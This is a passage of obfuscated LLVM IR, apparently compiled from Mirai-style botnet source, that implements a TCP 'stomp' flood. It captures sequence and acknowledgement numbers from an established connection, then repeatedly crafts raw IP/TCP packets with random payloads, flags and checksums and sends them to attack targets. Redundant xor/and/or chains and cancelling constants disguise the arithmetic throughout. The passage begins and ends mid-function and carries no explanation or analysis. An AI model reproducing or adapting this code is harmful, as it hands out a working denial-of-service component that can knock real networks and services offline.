  %239 = bitcast i8* %238 to %struct.tcphdr*
  store %struct.tcphdr* %239, %struct.tcphdr** %35, align 8
  %240 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 0
  %242 = load i16, i16* %241, align 4
  %243 = zext i16 %242 to i32
  %244 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %245 = load i16, i16* %244, align 2
  %246 = zext i16 %245 to i32
  %247 = icmp eq i32 %243, %246
  br i1 %247, label %248, label %688

; <label>:248:                                    ; preds = %236
  %249 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %250 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %249, i32 0, i32 4
  %251 = load i16, i16* %250, align 4
  %252 = lshr i16 %251, 9
  %253 = xor i16 %252, -1
  %254 = xor i16 1, -1
  %255 = xor i16 -672, -1
  %256 = or i16 %253, %254
  %257 = or i16 -672, %255
  %258 = xor i16 %256, -1
  %259 = and i16 %258, %257
  %260 = and i16 %252, 1
  %261 = zext i16 %259 to i32
  %262 = icmp ne i32 %261, 0
  br i1 %262, label %263, label %661

; <label>:263:                                    ; preds = %248
  %264 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %265 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %264, i32 0, i32 4
  %266 = load i16, i16* %265, align 4
  %267 = lshr i16 %266, 12
  %268 = xor i16 %267, -1
  %269 = xor i16 1, -1
  %270 = xor i16 23446, -1
  %271 = or i16 %268, %269
  %272 = or i16 23446, %270
  %273 = xor i16 %271, -1
  %274 = and i16 %273, %272
  %275 = and i16 %267, 1
  %276 = zext i16 %274 to i32
  %277 = icmp ne i32 %276, 0
  br i1 %277, label %278, label %661

; <label>:278:                                    ; preds = %263
  %279 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %280 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %279, i32 0, i32 0
  %281 = load i32, i32* %280, align 4
  %282 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %283 = load i32, i32* %9, align 4
  %284 = sext i32 %283 to i64
  %285 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %282, i64 %284
  %286 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %285, i32 0, i32 0
  store i32 %281, i32* %286, align 4
  %287 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %288 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %287, i32 0, i32 2
  %289 = load i32, i32* %288, align 4
  %290 = call i32 @ntohl(i32 %289) #7
  %291 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %292 = load i32, i32* %9, align 4
  %293 = sext i32 %292 to i64
  %294 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %291, i64 %293
  %295 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %294, i32 0, i32 1
  store i32 %290, i32* %295, align 4
  %296 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %297 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %296, i32 0, i32 3
  %298 = load i32, i32* %297, align 4
  %299 = call i32 @ntohl(i32 %298) #7
  %300 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %301 = load i32, i32* %9, align 4
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %300, i64 %302
  %304 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %303, i32 0, i32 2
  store i32 %299, i32* %304, align 4
  %305 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %306 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %305, i32 0, i32 1
  %307 = load i16, i16* %306, align 2
  %308 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %309 = load i32, i32* %9, align 4
  %310 = sext i32 %309 to i64
  %311 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %308, i64 %310
  %312 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %311, i32 0, i32 3
  store i16 %307, i16* %312, align 4
  %313 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %314 = load i16, i16* %313, align 2
  %315 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %316 = load i32, i32* %9, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %315, i64 %317
  %319 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %318, i32 0, i32 4
  store i16 %314, i16* %319, align 2
  %320 = load i32, i32* %24, align 4
  %321 = sext i32 %320 to i64
  %322 = sub i64 40, -6197545701267527230
  %323 = add i64 %322, %321
  %324 = add i64 %323, -6197545701267527230
  %325 = add i64 40, %321
  %326 = call noalias i8* @malloc(i64 %324) #6
  %327 = load i8**, i8*** %12, align 8
  %328 = load i32, i32* %9, align 4
  %329 = sext i32 %328 to i64
  %330 = getelementptr inbounds i8*, i8** %327, i64 %329
  store i8* %326, i8** %330, align 8
  %331 = load i8**, i8*** %12, align 8
  %332 = load i32, i32* %9, align 4
  %333 = sext i32 %332 to i64
  %334 = getelementptr inbounds i8*, i8** %331, i64 %333
  %335 = load i8*, i8** %334, align 8
  %336 = bitcast i8* %335 to %struct.iphdr*
  store %struct.iphdr* %336, %struct.iphdr** %36, align 8
  %337 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %338 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %337, i64 1
  %339 = bitcast %struct.iphdr* %338 to %struct.tcphdr*
  store %struct.tcphdr* %339, %struct.tcphdr** %37, align 8
  %340 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %341 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %340, i64 1
  %342 = bitcast %struct.tcphdr* %341 to i8*
  store i8* %342, i8** %38, align 8
  %343 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %344 = bitcast %struct.iphdr* %343 to i8*
  %345 = load i8, i8* %344, align 4
  %346 = xor i8 %345, -1
  %347 = xor i8 15, -1
  %348 = xor i8 -60, -1
  %349 = or i8 %346, %347
  %350 = or i8 -60, %348
  %351 = xor i8 %349, -1
  %352 = and i8 %351, %350
  %353 = and i8 %345, 15
  %354 = and i8 %352, 64
  %355 = xor i8 %352, 64
  %356 = or i8 %354, %355
  %357 = or i8 %352, 64
  store i8 %356, i8* %344, align 4
  %358 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %359 = bitcast %struct.iphdr* %358 to i8*
  %360 = load i8, i8* %359, align 4
  %361 = xor i8 -16, -1
  %362 = xor i8 %360, %361
  %363 = and i8 %362, %360
  %364 = and i8 %360, -16
  %365 = xor i8 %363, -1
  %366 = xor i8 5, -1
  %367 = xor i8 72, -1
  %368 = and i8 %365, 72
  %369 = and i8 %363, %367
  %370 = and i8 %366, 72
  %371 = and i8 5, %367
  %372 = or i8 %368, %369
  %373 = or i8 %370, %371
  %374 = xor i8 %372, %373
  %375 = or i8 %365, %366
  %376 = xor i8 %375, -1
  %377 = or i8 72, %367
  %378 = and i8 %376, %377
  %379 = or i8 %374, %378
  %380 = or i8 %363, 5
  store i8 %379, i8* %359, align 4
  %381 = load i8, i8* %13, align 1
  %382 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %383 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %382, i32 0, i32 1
  store i8 %381, i8* %383, align 1
  %384 = load i32, i32* %24, align 4
  %385 = sext i32 %384 to i64
  %386 = sub i64 0, 40
  %387 = sub i64 0, %385
  %388 = add i64 %386, %387
  %389 = sub i64 0, %388
  %390 = add i64 40, %385
  %391 = trunc i64 %389 to i16
  %392 = call zeroext i16 @htons(i16 zeroext %391) #7
  %393 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %394 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %393, i32 0, i32 2
  store i16 %392, i16* %394, align 2
  %395 = load i16, i16* %14, align 2
  %396 = call zeroext i16 @htons(i16 zeroext %395) #7
  %397 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %398 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %397, i32 0, i32 3
  store i16 %396, i16* %398, align 4
  %399 = load i8, i8* %15, align 1
  %400 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %401 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %400, i32 0, i32 5
  store i8 %399, i8* %401, align 4
  %402 = load i8, i8* %16, align 1
  %403 = icmp ne i8 %402, 0
  br i1 %403, label %404, label %408

; <label>:404:                                    ; preds = %278
  %405 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %406 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %407 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %406, i32 0, i32 4
  store i16 %405, i16* %407, align 2
  br label %408

; <label>:408:                                    ; preds = %404, %278
  %409 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 6
  store i8 6, i8* %410, align 1
  %411 = load i32, i32* @LOCAL_ADDR, align 4
  %412 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %413 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %412, i32 0, i32 8
  store i32 %411, i32* %413, align 4
  %414 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %415 = load i32, i32* %9, align 4
  %416 = sext i32 %415 to i64
  %417 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %414, i64 %416
  %418 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %417, i32 0, i32 0
  %419 = load i32, i32* %418, align 4
  %420 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %421 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %420, i32 0, i32 9
  store i32 %419, i32* %421, align 4
  %422 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %423 = load i32, i32* %9, align 4
  %424 = sext i32 %423 to i64
  %425 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %422, i64 %424
  %426 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %425, i32 0, i32 3
  %427 = load i16, i16* %426, align 4
  %428 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %429 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %428, i32 0, i32 0
  store i16 %427, i16* %429, align 4
  %430 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %431 = load i32, i32* %9, align 4
  %432 = sext i32 %431 to i64
  %433 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %430, i64 %432
  %434 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %433, i32 0, i32 4
  %435 = load i16, i16* %434, align 2
  %436 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %437 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %436, i32 0, i32 1
  store i16 %435, i16* %437, align 2
  %438 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %439 = load i32, i32* %9, align 4
  %440 = sext i32 %439 to i64
  %441 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %438, i64 %440
  %442 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %441, i32 0, i32 2
  %443 = load i32, i32* %442, align 4
  %444 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %445 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %444, i32 0, i32 2
  store i32 %443, i32* %445, align 4
  %446 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %447 = load i32, i32* %9, align 4
  %448 = sext i32 %447 to i64
  %449 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %446, i64 %448
  %450 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %449, i32 0, i32 1
  %451 = load i32, i32* %450, align 4
  %452 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %453 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %452, i32 0, i32 3
  store i32 %451, i32* %453, align 4
  %454 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %455 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %454, i32 0, i32 4
  %456 = load i16, i16* %455, align 4
  %457 = xor i16 %456, -1
  %458 = xor i16 -241, -1
  %459 = xor i16 -1665, -1
  %460 = or i16 %457, %458
  %461 = or i16 -1665, %459
  %462 = xor i16 %460, -1
  %463 = and i16 %462, %461
  %464 = and i16 %456, -241
  %465 = and i16 %463, 128
  %466 = xor i16 %463, 128
  %467 = or i16 %465, %466
  %468 = or i16 %463, 128
  store i16 %467, i16* %455, align 4
  %469 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %470 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %469, i32 0, i32 4
  %471 = load i16, i16* %470, align 4
  %472 = xor i16 %471, -1
  %473 = xor i16 -257, -1
  %474 = xor i16 -8982, -1
  %475 = or i16 %472, %473
  %476 = or i16 -8982, %474
  %477 = xor i16 %475, -1
  %478 = and i16 %477, %476
  %479 = and i16 %471, -257
  %480 = and i16 %478, 256
  %481 = xor i16 %478, 256
  %482 = or i16 %480, %481
  %483 = or i16 %478, 256
  store i16 %482, i16* %470, align 4
  %484 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %485 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %484, i32 0, i32 4
  %486 = load i16, i16* %485, align 4
  %487 = xor i16 %486, -1
  %488 = xor i16 -4097, -1
  %489 = xor i16 4758, -1
  %490 = or i16 %487, %488
  %491 = or i16 4758, %489
  %492 = xor i16 %490, -1
  %493 = and i16 %492, %491
  %494 = and i16 %486, -4097
  %495 = and i16 %493, 4096
  %496 = xor i16 %493, 4096
  %497 = or i16 %495, %496
  %498 = or i16 %493, 4096
  store i16 %497, i16* %485, align 4
  %499 = call i32 @rand_next()
  %500 = xor i32 65535, -1
  %501 = xor i32 %499, %500
  %502 = and i32 %501, %499
  %503 = and i32 %499, 65535
  %504 = trunc i32 %502 to i16
  %505 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %506 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %505, i32 0, i32 5
  store i16 %504, i16* %506, align 2
  %507 = load i8, i8* %18, align 1
  %508 = sext i8 %507 to i16
  %509 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %510 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %509, i32 0, i32 4
  %511 = load i16, i16* %510, align 4
  %512 = xor i16 1, -1
  %513 = xor i16 %508, %512
  %514 = and i16 %513, %508
  %515 = and i16 %508, 1
  %516 = shl i16 %514, 13
  %517 = xor i16 %511, -1
  %518 = xor i16 -8193, -1
  %519 = xor i16 31778, -1
  %520 = or i16 %517, %518
  %521 = or i16 31778, %519
  %522 = xor i16 %520, -1
  %523 = and i16 %522, %521
  %524 = and i16 %511, -8193
  %525 = and i16 %523, %516
  %526 = xor i16 %523, %516
  %527 = or i16 %525, %526
  %528 = or i16 %523, %516
  store i16 %527, i16* %510, align 4
  %529 = load i8, i8* %19, align 1
  %530 = sext i8 %529 to i16
  %531 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %532 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %531, i32 0, i32 4
  %533 = load i16, i16* %532, align 4
  %534 = xor i16 1, -1
  %535 = xor i16 %530, %534
  %536 = and i16 %535, %530
  %537 = and i16 %530, 1
  %538 = shl i16 %536, 12
  %539 = xor i16 -4097, -1
  %540 = xor i16 %533, %539
  %541 = and i16 %540, %533
  %542 = and i16 %533, -4097
  %543 = and i16 %541, %538
  %544 = xor i16 %541, %538
  %545 = or i16 %543, %544
  %546 = or i16 %541, %538
  store i16 %545, i16* %532, align 4
  %547 = load i8, i8* %20, align 1
  %548 = sext i8 %547 to i16
  %549 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %550 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %549, i32 0, i32 4
  %551 = load i16, i16* %550, align 4
  %552 = xor i16 1, -1
  %553 = xor i16 %548, %552
  %554 = and i16 %553, %548
  %555 = and i16 %548, 1
  %556 = shl i16 %554, 11
  %557 = xor i16 %551, -1
  %558 = xor i16 -2049, -1
  %559 = xor i16 -17629, -1
  %560 = or i16 %557, %558
  %561 = or i16 -17629, %559
  %562 = xor i16 %560, -1
  %563 = and i16 %562, %561
  %564 = and i16 %551, -2049
  %565 = xor i16 %563, -1
  %566 = xor i16 %556, -1
  %567 = xor i16 21151, -1
  %568 = and i16 %565, 21151
  %569 = and i16 %563, %567
  %570 = and i16 %566, 21151
  %571 = and i16 %556, %567
  %572 = or i16 %568, %569
  %573 = or i16 %570, %571
  %574 = xor i16 %572, %573
  %575 = or i16 %565, %566
  %576 = xor i16 %575, -1
  %577 = or i16 21151, %567
  %578 = and i16 %576, %577
  %579 = or i16 %574, %578
  %580 = or i16 %563, %556
  store i16 %579, i16* %550, align 4
  %581 = load i8, i8* %21, align 1
  %582 = sext i8 %581 to i16
  %583 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %584 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %583, i32 0, i32 4
  %585 = load i16, i16* %584, align 4
  %586 = xor i16 %582, -1
  %587 = xor i16 1, -1
  %588 = xor i16 14914, -1
  %589 = or i16 %586, %587
  %590 = or i16 14914, %588
  %591 = xor i16 %589, -1
  %592 = and i16 %591, %590
  %593 = and i16 %582, 1
  %594 = shl i16 %592, 10
  %595 = xor i16 %585, -1
  %596 = xor i16 -1025, -1
  %597 = xor i16 -4093, -1
  %598 = or i16 %595, %596
  %599 = or i16 -4093, %597
  %600 = xor i16 %598, -1
  %601 = and i16 %600, %599
  %602 = and i16 %585, -1025
  %603 = and i16 %601, %594
  %604 = xor i16 %601, %594
  %605 = or i16 %603, %604
  %606 = or i16 %601, %594
  store i16 %605, i16* %584, align 4
  %607 = load i8, i8* %22, align 1
  %608 = sext i8 %607 to i16
  %609 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %610 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %609, i32 0, i32 4
  %611 = load i16, i16* %610, align 4
  %612 = xor i16 1, -1
  %613 = xor i16 %608, %612
  %614 = and i16 %613, %608
  %615 = and i16 %608, 1
  %616 = shl i16 %614, 9
  %617 = xor i16 %611, -1
  %618 = xor i16 -513, -1
  %619 = xor i16 -7117, -1
  %620 = or i16 %617, %618
  %621 = or i16 -7117, %619
  %622 = xor i16 %620, -1
  %623 = and i16 %622, %621
  %624 = and i16 %611, -513
  %625 = xor i16 %623, -1
  %626 = xor i16 %616, -1
  %627 = xor i16 16653, -1
  %628 = and i16 %625, 16653
  %629 = and i16 %623, %627
  %630 = and i16 %626, 16653
  %631 = and i16 %616, %627
  %632 = or i16 %628, %629
  %633 = or i16 %630, %631
  %634 = xor i16 %632, %633
  %635 = or i16 %625, %626
  %636 = xor i16 %635, -1
  %637 = or i16 16653, %627
  %638 = and i16 %636, %637
  %639 = or i16 %634, %638
  %640 = or i16 %623, %616
  store i16 %639, i16* %610, align 4
  %641 = load i8, i8* %23, align 1
  %642 = sext i8 %641 to i16
  %643 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %644 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %643, i32 0, i32 4
  %645 = load i16, i16* %644, align 4
  %646 = xor i16 1, -1
  %647 = xor i16 %642, %646
  %648 = and i16 %647, %642
  %649 = and i16 %642, 1
  %650 = shl i16 %648, 8
  %651 = xor i16 -257, -1
  %652 = xor i16 %645, %651
  %653 = and i16 %652, %645
  %654 = and i16 %645, -257
  %655 = and i16 %653, %650
  %656 = xor i16 %653, %650
  %657 = or i16 %655, %656
  %658 = or i16 %653, %650
  store i16 %657, i16* %644, align 4
  %659 = load i8*, i8** %38, align 8
  %660 = load i32, i32* %24, align 4
  call void @rand_str(i8* %659, i32 %660)
  br label %700

; <label>:661:                                    ; preds = %263, %248
  %662 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %663 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %662, i32 0, i32 4
  %664 = load i16, i16* %663, align 4
  %665 = lshr i16 %664, 8
  %666 = xor i16 1, -1
  %667 = xor i16 %665, %666
  %668 = and i16 %667, %665
  %669 = and i16 %665, 1
  %670 = zext i16 %668 to i32
  %671 = icmp ne i32 %670, 0
  br i1 %671, label %683, label %672

; <label>:672:                                    ; preds = %661
  %673 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %674 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %673, i32 0, i32 4
  %675 = load i16, i16* %674, align 4
  %676 = lshr i16 %675, 10
  %677 = xor i16 1, -1
  %678 = xor i16 %676, %677
  %679 = and i16 %678, %676
  %680 = and i16 %676, 1
  %681 = zext i16 %679 to i32
  %682 = icmp ne i32 %681, 0
  br i1 %682, label %683, label %686

; <label>:683:                                    ; preds = %672, %661
  %684 = load i32, i32* %26, align 4
  %685 = call i32 @close(i32 %684)
  br label %121

; <label>:686:                                    ; preds = %672
  br label %687

; <label>:687:                                    ; preds = %686
  br label %688

; <label>:688:                                    ; preds = %687, %236
  br label %689

; <label>:689:                                    ; preds = %688, %232, %224
  %690 = call i64 @time(i64* null) #6
  %691 = load i64, i64* %31, align 8
  %692 = sub i64 0, %691
  %693 = add i64 %690, %692
  %694 = sub nsw i64 %690, %691
  %695 = icmp sgt i64 %693, 10
  br i1 %695, label %696, label %699

; <label>:696:                                    ; preds = %689
  %697 = load i32, i32* %26, align 4
  %698 = call i32 @close(i32 %697)
  br label %121

; <label>:699:                                    ; preds = %689
  br label %212

; <label>:700:                                    ; preds = %408
  br label %701

; <label>:701:                                    ; preds = %700, %124
  %702 = load i32, i32* %9, align 4
  %703 = sub i32 0, 1
  %704 = sub i32 %702, %703
  %705 = add nsw i32 %702, 1
  store i32 %704, i32* %9, align 4
  br label %115

; <label>:706:                                    ; preds = %115
  br label %707

; <label>:707:                                    ; preds = %835, %706
  store i32 0, i32* %9, align 4
  br label %708

; <label>:708:                                    ; preds = %829, %707
  %709 = load i32, i32* %9, align 4
  %710 = load i8, i8* %5, align 1
  %711 = zext i8 %710 to i32
  %712 = icmp slt i32 %709, %711
  br i1 %712, label %713, label %835

; <label>:713:                                    ; preds = %708
  %714 = load i8**, i8*** %12, align 8
  %715 = load i32, i32* %9, align 4
  %716 = sext i32 %715 to i64
  %717 = getelementptr inbounds i8*, i8** %714, i64 %716
  %718 = load i8*, i8** %717, align 8
  store i8* %718, i8** %39, align 8
  %719 = load i8*, i8** %39, align 8
  %720 = bitcast i8* %719 to %struct.iphdr*
  store %struct.iphdr* %720, %struct.iphdr** %40, align 8
  %721 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %722 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %721, i64 1
  %723 = bitcast %struct.iphdr* %722 to %struct.tcphdr*
  store %struct.tcphdr* %723, %struct.tcphdr** %41, align 8
  %724 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %725 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %724, i64 1
  %726 = bitcast %struct.tcphdr* %725 to i8*
  store i8* %726, i8** %42, align 8
  %727 = load i16, i16* %14, align 2
  %728 = zext i16 %727 to i32
  %729 = icmp eq i32 %728, 65535
  br i1 %729, label %730, label %739

; <label>:730:                                    ; preds = %713
  %731 = call i32 @rand_next()
  %732 = xor i32 65535, -1
  %733 = xor i32 %731, %732
  %734 = and i32 %733, %731
  %735 = and i32 %731, 65535
  %736 = trunc i32 %734 to i16
  %737 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %738 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %737, i32 0, i32 3
  store i16 %736, i16* %738, align 4
  br label %739

; <label>:739:                                    ; preds = %730, %713
  %740 = load i8, i8* %25, align 1
  %741 = icmp ne i8 %740, 0
  br i1 %741, label %742, label %745

; <label>:742:                                    ; preds = %739
  %743 = load i8*, i8** %42, align 8
  %744 = load i32, i32* %24, align 4
  call void @rand_str(i8* %743, i32 %744)
  br label %745

; <label>:745:                                    ; preds = %742, %739
  %746 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %747 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %746, i32 0, i32 7
  store i16 0, i16* %747, align 2
  %748 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %749 = bitcast %struct.iphdr* %748 to i16*
  %750 = call zeroext i16 @checksum_generic(i16* %749, i32 20)
  %751 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %752 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %751, i32 0, i32 7
  store i16 %750, i16* %752, align 2
  %753 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %754 = load i32, i32* %9, align 4
  %755 = sext i32 %754 to i64
  %756 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %753, i64 %755
  %757 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %756, i32 0, i32 1
  %758 = load i32, i32* %757, align 4
  %759 = add i32 %758, 2130606088
  %760 = add i32 %759, 1
  %761 = sub i32 %760, 2130606088
  %762 = add i32 %758, 1
  store i32 %761, i32* %757, align 4
  %763 = trunc i32 %758 to i16
  %764 = call zeroext i16 @htons(i16 zeroext %763) #7
  %765 = zext i16 %764 to i32
  %766 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %767 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %766, i32 0, i32 2
  store i32 %765, i32* %767, align 4
  %768 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %769 = load i32, i32* %9, align 4
  %770 = sext i32 %769 to i64
  %771 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %768, i64 %770
  %772 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %771, i32 0, i32 2
  %773 = load i32, i32* %772, align 4
  %774 = trunc i32 %773 to i16
  %775 = call zeroext i16 @htons(i16 zeroext %774) #7
  %776 = zext i16 %775 to i32
  %777 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %778 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %777, i32 0, i32 3
  store i32 %776, i32* %778, align 4
  %779 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %780 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %779, i32 0, i32 6
  store i16 0, i16* %780, align 4
  %781 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %782 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %783 = bitcast %struct.tcphdr* %782 to i8*
  %784 = load i32, i32* %24, align 4
  %785 = sext i32 %784 to i64
  %786 = add i64 20, -4213070027992106982
  %787 = add i64 %786, %785
  %788 = sub i64 %787, -4213070027992106982
  %789 = add i64 20, %785
  %790 = trunc i64 %788 to i16
  %791 = call zeroext i16 @htons(i16 zeroext %790) #7
  %792 = load i32, i32* %24, align 4
  %793 = sext i32 %792 to i64
  %794 = add i64 20, 4338982718038807328
  %795 = add i64 %794, %793
  %796 = sub i64 %795, 4338982718038807328
  %797 = add i64 20, %793
  %798 = trunc i64 %796 to i32
  %799 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %781, i8* %783, i16 zeroext %791, i32 %798)
  %800 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %801 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %800, i32 0, i32 6
  store i16 %799, i16* %801, align 4
  %802 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %803 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %802, i32 0, i32 1
  %804 = load i16, i16* %803, align 2
  %805 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %806 = load i32, i32* %9, align 4
  %807 = sext i32 %806 to i64
  %808 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %805, i64 %807
  %809 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %808, i32 0, i32 0
  %810 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %809, i32 0, i32 1
  store i16 %804, i16* %810, align 2
  %811 = load i32, i32* %10, align 4
  %812 = load i8*, i8** %39, align 8
  %813 = load i32, i32* %24, align 4
  %814 = sext i32 %813 to i64
  %815 = add i64 40, -6717216627864220991
  %816 = add i64 %815, %814
  %817 = sub i64 %816, -6717216627864220991
  %818 = add i64 40, %814
  %819 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %820 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %821 = load i32, i32* %9, align 4
  %822 = sext i32 %821 to i64
  %823 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %820, i64 %822
  %824 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %823, i32 0, i32 0
  %825 = bitcast %struct.sockaddr_in* %824 to %struct.sockaddr*
  store %struct.sockaddr* %825, %struct.sockaddr** %819, align 8
  %826 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
